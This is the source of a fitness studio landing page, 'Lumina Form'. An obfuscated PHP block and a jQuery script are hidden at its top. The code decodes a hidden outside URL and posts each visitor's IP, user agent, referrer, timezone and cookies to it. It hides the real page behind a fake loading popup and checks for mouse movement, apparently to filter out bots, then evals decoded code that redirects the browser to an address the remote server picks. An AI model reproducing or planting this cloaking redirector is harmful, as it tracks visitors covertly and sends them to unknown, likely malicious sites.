
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo522041ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo522041ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "522041";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo522041ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lumina Form - Fitness & Wellness Center in New York</title>
  <meta name="description" content="Experience holistic wellness at Lumina Form. We offer personalized fitness programs, nutritional guidance, body sculpting classes, and wellness workshops in NY.">
  <link rel="icon" href="favicon.ico">
  <script src="https://cdn.tailwindcss.com"></script>

<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo522041ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo522041ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>

  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=PT+Serif:wght@300;700&display=swap');

    :root {
      --primary-50: oklch(0.96 0.12 258);
      --primary-300: oklch(0.75 0.13 258);
      --primary-500: oklch(0.55 0.15 258);
      --primary-700: oklch(0.40 0.15 258);
      --surface-glass: rgba(255, 255, 255, 0.1);
      --surface-glass-dark: rgba(26, 26, 46, 0.6);
      --background-dark: #1a1a2e;
      --border-radius: 16px;
      --card-shadow: 0 2px 4px rgba(0,0,0,0.1);
      --hover-shadow-grow: 0 10px 15px rgba(0,0,0,0.2);
    }

    body {
      font-family: 'PT Serif', serif;
      font-weight: 300;
      color: #e0e0e0;
      background-color: var(--background-dark);
      line-height: 1.6;
    }

    h1, h2, h3, h4, h5, h6 {
      font-weight: 700;
      color: #ffffff;
    }

    .btn-primary-gradient {
      background: linear-gradient(90deg, var(--primary-500) 0%, var(--primary-700) 100%);
      color: white;
      border-radius: var(--border-radius);
      padding: 0.75rem 1.5rem;
      transition: all 0.3s ease;
    }
    .btn-primary-gradient:hover {
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      filter: brightness(1.1);
    }

    .glassmorphic-card {
      background: var(--surface-glass);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      transition: box-shadow 0.3s ease, transform 0.3s ease;
      background-clip: padding-box; /* Ensures blur doesn't apply to border box */
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .glassmorphic-card:hover {
      box-shadow: var(--hover-shadow-grow);
    }

    .glassmorphic-pane-dark {
      background: var(--surface-glass-dark);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: var(--border-radius);
      box-shadow: var(--card-shadow);
      background-clip: padding-box;
      border: 1px solid rgba(255, 255, 255, 0.05); /* Even subtler border for dark */
    }

    .circular-icon-container {
      width: 64px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background: var(--surface-glass);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: background 0.3s ease;
    }
    .circular-icon-container:hover {
      background: var(--primary-300);
    }

    .section-spacing {
      padding-top: 1.5rem; /* 24px */
      padding-bottom: 1.5rem; /* 24px */
    }

    /* Subtle hover effect for images */
    .image-hover-zoom {
      transition: transform 0.3s ease;
    }
    .image-hover-zoom:hover {
      transform: scale(1.03);
    }

    .text-fade-in {
      opacity: 0;
      animation: fadeIn 0.8s forwards;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }

    /* Ensure text contrast for dark backgrounds */
    .dark-bg-text {
        color: #f8f9fa; /* Light text on dark bg */
    }
    .dark-bg-text a {
        color: var(--primary-300);
    }
    .dark-bg-text a:hover {
        color: var(--primary-50);
    }

    /* Cookie Consent */
    #cookie-consent-banner {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: rgba(33, 37, 41, 0.9); /* Darker backdrop so text is visible */
      color: white;
      text-align: center;
      padding: 1rem;
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
      z-index: 1000;
      display: none; /* Hidden by default */
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
    }
    #cookie-consent-banner button {
      background-color: var(--primary-500);
      color: white;
      border: none;
      padding: 0.5rem 1rem;
      border-radius: 8px;
      cursor: pointer;
      margin-left: 1rem;
    }
    #cookie-consent-banner button:hover {
      background-color: var(--primary-700);
    }
  </style>
  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-YTP08B4056');
</script>

</head>
<body class="dark-bg-text">
  <header class="bg-gradient-to-r from-gray-900 to-[#1a1a2e] sticky top-0 z-50 shadow-lg">
    <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex justify-between items-center">
      <div class="flex-shrink-0">
        <a href="#hero" class="text-2xl font-bold text-white tracking-wider">Lumina Form</a>
      </div>
      <div class="hidden md:block">
        <div class="ml-10 flex items-baseline space-x-6">
          <a href="#services" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition duration-300">Services</a>
          <a href="#philosophy" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition duration-300">Philosophy</a>
          <a href="#booking" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition duration-300">Book Class</a>
          <a href="#tips" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition duration-300">Health Tips</a>
          <a href="#contact" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition duration-300">Contact</a>
        </div>
      </div>
      <div class="-mr-2 flex md:hidden">
        
        <button type="button" class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-white hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-800 focus:ring-white" aria-controls="mobile-menu" aria-expanded="false">
          <span class="sr-only">Open main menu</span>
          <svg class="block h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
          </svg>
          <svg class="hidden h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
      </div>
    </nav>

    
    <div class="md:hidden" id="mobile-menu">
      <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3 bg-gray-800">
        <a href="#services" class="text-gray-300 hover:bg-gray-700 hover:text-white block px-3 py-2 rounded-md text-base font-medium transition duration-300">Services</a>
        <a href="#philosophy" class="text-gray-300 hover:bg-gray-700 hover:text-white block px-3 py-2 rounded-md text-base font-medium transition duration-300">Philosophy</a>
        <a href="#booking" class="text-gray-300 hover:bg-gray-700 hover:text-white block px-3 py-2 rounded-md text-base font-medium transition duration-300">Book Class</a>
        <a href="#tips" class="text-gray-300 hover:bg-gray-700 hover:text-white block px-3 py-2 rounded-md text-base font-medium transition duration-300">Health Tips</a>
        <a href="#contact" class="text-gray-300 hover:bg-gray-700 hover:text-white block px-3 py-2 rounded-md text-base font-medium transition duration-300">Contact</a>
      </div>
    </div>
  </header>
<main>
    <section id="hero" class="relative bg-[var(--background-dark)] py-12 md:py-24 text-center overflow-hidden">
      <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 z-10 relative">
        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-bold mb-4 leading-tight text-fade-in">Elevate Your Well-being at Lumina Form</h1>
        <p class="text-lg sm:text-xl mb-8 font-light text-gray-300 text-fade-in delay-200">A unique synergy of body sculpting, personalized fitness, and holistic nutrition based in the heart of New York.</p>
        <a href="#booking" class="btn-primary-gradient inline-block text-lg font-medium shadow-lg hover:shadow-xl transition duration-300 text-fade-in delay-400">Start Your Transformation</a>
      </div>
      <div class="relative w-full mt-12 overflow-hidden">
        <img src="images/hero-fitness-studio-1280x640.jpeg" alt="Lumina Form wellness studio interior and fitness equipment" width="1280" height="640" class="w-full h-auto object-cover image-hover-zoom">
      </div>
    </section>

    <section id="services" class="section-spacing bg-gray-900 bg-opacity-70">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
        <h2 class="text-3xl sm:text-4xl font-bold mb-10 text-white">Our Holistic Services</h2>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <div class="circular-icon-container mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c1.657 0 3 .895 3 2s-1.343 2-3 2-3-.895-3-2 1.343-2 3-2zM9 14h6m-5.456 4.708l-2.029-2.029m-1.077 4.02L2.7 20.3a1 1 0 011.414-1.414l1.636 1.636a.75.75 0 001.06 0l2.029-2.029m-4.475 2.029l-2.029-2.029m14.475 2.029l2.029-2.029m-1.077 4.02L21.3 20.3a1 1 0 00-1.414-1.414l-1.636 1.636a.75.75 0 01-1.06 0l-2.029-2.029m4.475 2.029l2.029-2.029M12 21a9 9 0 100-18 9 9 0 000 18z" />
              </svg>
            </div>
            <h3 class="text-xl font-bold mb-3 text-white">Personalized Fitness</h3>
            <p class="text-gray-200 font-light mb-4">Custom-tailored workout regimens designed around your unique physiological baseline and individual goals, ensuring optimal progress and lasting results.</p>
            <img src="images/service-fitness-384x384.jpeg" alt="Individual working out with a trainer for personalized fitness" width="384" height="384" class="rounded-[var(--border-radius)] w-full h-48 object-cover image-hover-zoom">
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <div class="circular-icon-container mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20v-2a4 4 0 00-4-4H7a4 4 0 00-4 4v2m3-5a4 4 0 014-4h4a4 4 0 014 4M7 4h10a2 2 0 012 2v2a2 2 0 01-2 2H7a2 2 0 01-2-2V6a2 2 0 012-2z" />
              </svg>
            </div>
            <h3 class="text-xl font-bold mb-3 text-white">Body Sculpting Classes</h3>
            <p class="text-gray-200 font-light mb-4">High-energy, targeted group sessions focused on biomechanical alignment, muscular endurance, and aesthetic definition.</p>
            <img src="images/service-sculpting-384x384.jpeg" alt="Group class performing body sculpting exercises" width="384" height="384" class="rounded-[var(--border-radius)] w-full h-48 object-cover image-hover-zoom">
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <div class="circular-icon-container mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c1.657 0 3 .895 3 2s-1.343 2-3 2-3-.895-3-2 1.343-2 3-2zM21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <h3 class="text-xl font-bold mb-3 text-white">Nutritional Guidance</h3>
            <p class="text-gray-200 font-light mb-4">Science-backed dietary planning and personalized coaching to fuel your recovery, optimize metabolic function, and sustain long-term health.</p>
            <img src="images/service-nutrition-384x384.jpeg" alt="Fresh ingredients for nutritional meal planning" width="384" height="384" class="rounded-[var(--border-radius)] w-full h-48 object-cover image-hover-zoom">
          </div>
        </div>
      </div>
    </section>

    <section id="philosophy" class="section-spacing bg-[var(--background-dark)]">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="glassmorphic-pane-dark p-6 md:p-12 flex flex-col md:flex-row items-center gap-8">
          <div class="md:w-1/2 order-2 md:order-1 text-center md:text-left">
            <h2 class="text-3xl sm:text-4xl font-bold mb-6 text-white">The Lumina Form Approach</h2>
            <p class="text-lg font-light text-gray-200 leading-relaxed">At Lumina Form, we believe true wellness extends beyond the physical exertion of a workout. From our comprehensive wellness workshops to our personalized plans, we integrate mental clarity techniques, mobility work, and sustainable nutritional architectures to ensure lifelong health and vitality.</p>
          </div>
          <div class="md:w-1/2 order-1 md:order-2">
            <img src="images/philosophy-wellness-896x512.jpeg" alt="Mindfulness and wellness workshop at Lumina Form" width="896" height="512" class="rounded-[var(--border-radius)] w-full h-auto object-cover image-hover-zoom shadow-md">
          </div>
        </div>
      </div>
    </section>

    <section id="booking" class="section-spacing bg-gray-900 bg-opacity-70 text-center">
      <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <h2 class="text-3xl sm:text-4xl font-bold mb-6 text-white">Upcoming Classes & Workshops</h2>
        <p class="text-lg font-light text-gray-200 mb-10">Secure your spot in our specialized sessions designed to elevate your fitness journey.</p>
        <div class="grid grid-cols-1 gap-6">
          <div class="glassmorphic-pane-dark p-6 flex flex-col sm:flex-row justify-between items-center text-left hover:scale-[1.01] transition-transform duration-300">
            <div>
              <p class="text-sm text-gray-400">Monday, 08:00 AM</p>
              <h3 class="text-xl font-bold text-white mb-1">Advanced Body Sculpting</h3>
              <p class="text-gray-300 font-light">Instructor: Lead Trainer</p>
            </div>
            <a href="#" class="btn-primary-gradient mt-4 sm:mt-0 font-medium">Book Now</a>
          </div>

          <div class="glassmorphic-pane-dark p-6 flex flex-col sm:flex-row justify-between items-center text-left hover:scale-[1.01] transition-transform duration-300">
            <div>
              <p class="text-sm text-gray-400">Wednesday, 06:00 PM</p>
              <h3 class="text-xl font-bold text-white mb-1">Mindful Wellness Workshop</h3>
              <p class="text-gray-300 font-light">Instructor: Holistic Coach</p>
            </div>
            <a href="#" class="btn-primary-gradient mt-4 sm:mt-0 font-medium">Book Now</a>
          </div>

          <div class="glassmorphic-pane-dark p-6 flex flex-col sm:flex-row justify-between items-center text-left hover:scale-[1.01] transition-transform duration-300">
            <div>
              <p class="text-sm text-gray-400">Friday, 07:00 AM</p>
              <h3 class="text-xl font-bold text-white mb-1">Metabolic Fitness Flow</h3>
              <p class="text-gray-300 font-light">Instructor: Senior Biomechanic</p>
            </div>
            <a href="#" class="btn-primary-gradient mt-4 sm:mt-0 font-medium">Book Now</a>
          </div>
        </div>
      </div>
    </section>

    <section id="tips" class="section-spacing bg-[var(--background-dark)]">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
        <h2 class="text-3xl sm:text-4xl font-bold mb-10 text-white">Health & Wellness Insights</h2>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div class="glassmorphic-card p-6 flex flex-col items-center hover:scale-[1.01] transition-transform duration-300">
            <img src="images/tip-recovery-384x256.jpeg" alt="Athlete stretching for post-workout recovery" width="384" height="256" class="rounded-[var(--border-radius)] w-full h-48 object-cover mb-4 image-hover-zoom">
            <h3 class="text-xl font-bold mb-2 text-white">Optimizing Post-Workout Recovery</h3>
            <p class="text-gray-200 font-light text-center">Discover how active mobility work, proper hydration, and targeted nutrition can accelerate muscle repair and enhance overall recovery after intense training sessions.</p>
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center hover:scale-[1.01] transition-transform duration-300">
            <img src="images/tip-nutrition-384x256.jpeg" alt="Assortment of fresh macronutrient-rich foods" width="384" height="256" class="rounded-[var(--border-radius)] w-full h-48 object-cover mb-4 image-hover-zoom">
            <h3 class="text-xl font-bold mb-2 text-white">Macronutrients Explained</h3>
            <p class="text-gray-200 font-light text-center">Learn how to strategically balance your proteins, carbohydrates, and fats to effectively fuel intense body sculpting sessions and support muscle growth.</p>
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center hover:scale-[1.01] transition-transform duration-300">
            <img src="images/tip-mindfulness-384x256.jpeg" alt="Person meditating in a serene environment" width="384" height="256" class="rounded-[var(--border-radius)] w-full h-48 object-cover mb-4 image-hover-zoom">
            <h3 class="text-xl font-bold mb-2 text-white">The Role of Mindfulness</h3>
            <p class="text-gray-200 font-light text-center">Explore why mental conditioning, stress reduction, and mindful practices are just as crucial as physical training for achieving holistic wellness and peak performance.</p>
          </div>
        </div>
      </div>
    </section>

    <section id="testimonials" class="section-spacing bg-gray-900 bg-opacity-70 text-center">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <h2 class="text-3xl sm:text-4xl font-bold mb-10 text-white">Client Transformations</h2>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <img src="images/avatar-sarah-128x128.jpeg" alt="Avatar of Sarah Kaelen" width="128" height="128" class="rounded-full w-24 h-24 object-cover mb-4 shadow-md">
            <p class="text-gray-200 text-lg italic mb-3 font-light">"Lumina Form completely redefined my relationship with fitness. The body sculpting classes are unparalleled, and I've never felt stronger or more confident."</p>
            <p class="text-gray-400 font-medium">- Sarah Kaelen</p>
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <img src="images/avatar-michael-128x128.jpeg" alt="Avatar of Michael Petrov" width="128" height="128" class="rounded-full w-24 h-24 object-cover mb-4 shadow-md">
            <p class="text-gray-200 text-lg italic mb-3 font-light">"Their nutritional guidance gave me the energy I was missing. Truly a holistic, life-changing approach that educated me beyond just workouts."</p>
            <p class="text-gray-400 font-medium">- Michael Petrov</p>
          </div>

          <div class="glassmorphic-card p-6 flex flex-col items-center text-center">
            <img src="images/avatar-elena-128x128.jpeg" alt="Avatar of Elena Rodriguez" width="128" height="128" class="rounded-full w-24 h-24 object-cover mb-4 shadow-md">
            <p class="text-gray-200 text-lg italic mb-3 font-light">"The trainers at Lumina Form are incredibly knowledgeable and supportive. The personalized program delivered actual results I could see and feel."</p>
            <p class="text-gray-400 font-medium">- Elena Rodriguez</p>
          </div>
        </div>
      </div>
    </section>
  </main>
<footer id="contact" class="bg-[#212529] dark-bg-text py-12 md:py-16">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center md:text-left">
      <div class="grid grid-cols-1 md:grid-cols-3 gap-8 items-start">
        <div class="mb-8 md:mb-0">
          <h3 class="text-2xl font-bold mb-4">Lumina Form</h3>
          <p class="text-gray-300 font-light mb-2">Your partner in holistic well-being.</p>
          <p class="text-gray-400 font-light">Nurturing body, mind, and spirit for a healthier you.</p>
        </div>

        <div class="mb-8 md:mb-0">
          <h4 class="text-xl font-bold mb-4">Reach Out</h4>
          <p class="text-gray-300 font-light flex items-center md:justify-start justify-center mb-2">
            <span class="circular-icon-container mr-3 flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
            </span>
            773 Hancock Street, New York, NY 11221, USA
          </p>
          <p class="text-gray-300 font-light flex items-center md:justify-start justify-center mb-2">
            <span class="circular-icon-container mr-3 flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
              </svg>
            </span>
            +12742650387
          </p>
          <a href="mailto:info@<?php echo $_SERVER['HTTP_HOST']; ?>" class="text-gray-300 font-light flex items-center md:justify-start justify-center hover:text-white transition duration-300">
            <span class="circular-icon-container mr-3 flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
              </svg>
            </span>
            info@<?php echo $_SERVER['HTTP_HOST']; ?>
          </a>
        </div>

        <div>
          <h4 class="text-xl font-bold mb-4">Quick Links</h4>
          <ul class="space-y-2">
            <li><a href="#services" class="text-gray-300 hover:text-white transition duration-300 font-light">Services</a></li>
            <li><a href="#philosophy" class="text-gray-300 hover:text-white transition duration-300 font-light">Philosophy</a></li>
            <li><a href="#booking" class="text-gray-300 hover:text-white transition duration-300 font-light">Book a Class</a></li>
            <li><a href="./privacy.html" class="text-gray-300 hover:text-white transition duration-300 font-light">Privacy Policy</a></li>
            <li><a href="./tos.html" class="text-gray-300 hover:text-white transition duration-300 font-light">Terms of Service</a></li>
          </ul>
        </div>
      </div>

      <div class="mt-12 pt-8 border-t border-gray-700 text-center text-gray-500 text-sm font-light">
        <p>&copy; 2024 Lumina Form. All rights reserved.</p>
      </div>
    </div>
  </footer>

  <div id="cookie-consent-banner">
    <p>We use cookies to ensure you get the best experience on our website. By continuing to use this site, you agree to our <a href="./privacy.html" class="underline text-blue-300 hover:text-blue-500">Privacy Policy</a>.</p>
    <button id="accept-cookies">Accept</button>
  </div>

  <script>
    // Mobile menu toggle
    document.querySelector('[aria-controls="mobile-menu"]').addEventListener('click', function() {
      const mobileMenu = document.getElementById('mobile-menu');
      const isExpanded = this.getAttribute('aria-expanded') === 'true' || false;
      this.setAttribute('aria-expanded', !isExpanded);
      mobileMenu.classList.toggle('hidden');
    });

    // Cookie Consent Logic
    const cookieNamePrefix = "consent_"; // Matches the logic from instructions
    const consentCookieName = cookieNamePrefix + "status";
    const cookieBanner = document.getElementById('cookie-consent-banner');
    const acceptButton = document.getElementById('accept-cookies');

    function setCookie(name, value, days) {
      let expires = "";
      if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + (value || "") + expires + "; path=/";
    }

    function getCookie(name) {
      const nameEQ = name + "=";
      const ca = document.cookie.split(';');
      for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
      }
      return null;
    }

    if (!getCookie(consentCookieName)) {
      cookieBanner.style.display = 'block';
    }

    acceptButton.addEventListener('click', function() {
      setCookie(consentCookieName, "accepted", 365); // Consent valid for 1 year
      cookieBanner.style.display = 'none';
    });
  </script>
</body>
</html>
